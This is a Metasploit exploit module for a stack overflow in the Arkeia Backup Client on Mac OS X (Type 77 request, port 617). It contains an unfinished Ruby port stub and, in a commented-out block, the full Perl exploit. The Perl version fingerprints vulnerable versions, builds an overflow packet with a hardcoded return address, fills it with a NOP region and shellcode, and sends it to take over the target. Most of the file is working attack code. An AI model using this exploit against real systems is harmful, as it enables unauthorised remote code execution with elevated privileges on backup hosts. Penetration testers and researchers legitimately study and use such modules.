require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Arkeia Backup Client Type 77 Overflow (Mac OS X)',
			'Description'    => %q{
				This module exploits a stack overflow in the Arkeia backup
				client for the Mac OS X platform. This vulnerability affects
				all versions up to and including 5.3.3 and has been tested
				with Arkeia 5.3.1 on Mac OS X 10.3.5.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '14011'],
					[ 'BID', '12594'],
					[ 'URL', 'http://lists.netsys.com/pipermail/full-disclosure/2005-February/031831.html'],
					[ 'MIL', '6'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "\x00",
					'MinNops'  => 700,

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'osx',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Feb 18 2005',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::arkeia_type77_macos;
use base "Msf::Exploit";
use strict;
use Pex::Text;
use Pex::Arkeia;

my $advanced = { };

my $info =
{
	'Name'     => 'Arkeia Backup Client Type 77 Overflow (Mac OS X)',
	'Version'  => '$Revision$',
	'Authors'  => [ 'H D Moore <hdm [at] metasploit.com>' ],
	'Arch'     => [ 'ppc' ],
	'OS'       => [ 'osx'],
	'Priv'     => 1,
	
	'UserOpts' => 
	{
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 617],
	},

	'Payload' => 
	{
		'Space'     => 1000,
		'BadChars'  => "\x00",
		'MinNops'	=> 700,
	},

	'Description'  => Pex::Text::Freeform(qq{
		This module exploits a stack overflow in the Arkeia backup
		client for the Mac OS X platform. This vulnerability affects
		all versions up to and including 5.3.3 and has been tested 
		with Arkeia 5.3.1 on Mac OS X 10.3.5. 
	}),

	'Refs'    => 
	[
		['OSVDB', '14011'],
		['BID', '12594'],
		['URL', 'http://lists.netsys.com/pipermail/full-disclosure/2005-February/031831.html'],
		['MIL', '6'],
	],
	
	'Targets' => 
	[
		['Arkeia 5.3.1 Stack Return (boot)',	0xbffff910 ],
	],
	
	'Keys'    => ['arkeia'],

	'DisclosureDate' => 'Feb 18 2005',
};

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}


sub Check {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	
	my $s = Msf::Socket::Tcp->new
	(
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
	);

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return $self->CheckCode('Connect');
	}
	
	$self->PrintLine("[*] Querying the Arkeia Backup Client...");
	my %info = Pex::Arkeia::ClientInfo($s);
	
	# Give up if we did not get a version response back
	if (! $info{'Version'} ) {
		$self->PrintLine("[*] Error: ". $info{'Error'});
		return $self->CheckCode('Unknown');
	}
	
	# Dump out the information returned by the server
	$self->PrintLine("[*] System Information");
	foreach my $inf (keys %info) {
		next if $inf eq 'Error';
		$self->PrintLine("      $inf: $info{$inf}");
	}

	# Throw a warning if they are using the wrong exploit	
	if ($info{'System'} !~ /Darwin/i) {
		$self->PrintLine("[*] This module is not able to exploit the ".$info{'System'}." platform");
	}
	
	# We are going to assume that they will fix this in the next release
	if ($info{'Version'} =~ /Backup (4\.|5\.([012]\.|3\.[0123]$))/) {
		$self->PrintLine("[*] This system appears to be vulnerable");
		return $self->CheckCode('Confirmed');
	}
	
	# This is more than likely not vulnerable...
	$self->PrintLine("[*] This version may not be vulnerable");

	return $self->CheckCode('Safe');	
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target = $self->Targets->[$target_idx];

	$self->PrintLine("[*] Attempting to exploit target " . $target->[0]);

	my $s = Msf::Socket::Tcp->new
	(
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
	);

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}
	
	my $head = "\x00\x4d\x00\x03\x00\x01\xff\xff";
	
	# Request has to be big enough to find and small enough
	# not to write off the end of the stack. If we write too
	# far down, we also smash env[], which causes a crash in
	# getenv() before our function returns.
	
	my $poof = Pex::Text::EnglishText(1200);

	# Configure the length value of the data in the packet header
	substr($head, 6, 2, pack('n', length($poof)));
	
	# Return back to the stack either directly or via system lib
	substr($poof,  0, 112, pack('N', $target->[1]) x (112 / 4));

	# Huge nop slep followed by the payload
	substr($poof, 112, length($shellcode), $shellcode);
	

	$self->PrintLine("[*] Sending " .length($poof) . " bytes to remote host.");
	$s->Send($head);
	$s->Send($poof);
	
	# Wait a few seconds for the payload to pop...
	$s->Recv(-1, 10);
	
	# Call the payload handler if one exists 
	$self->Handler($s);
	
	return;
}

1;

=end


end
end	
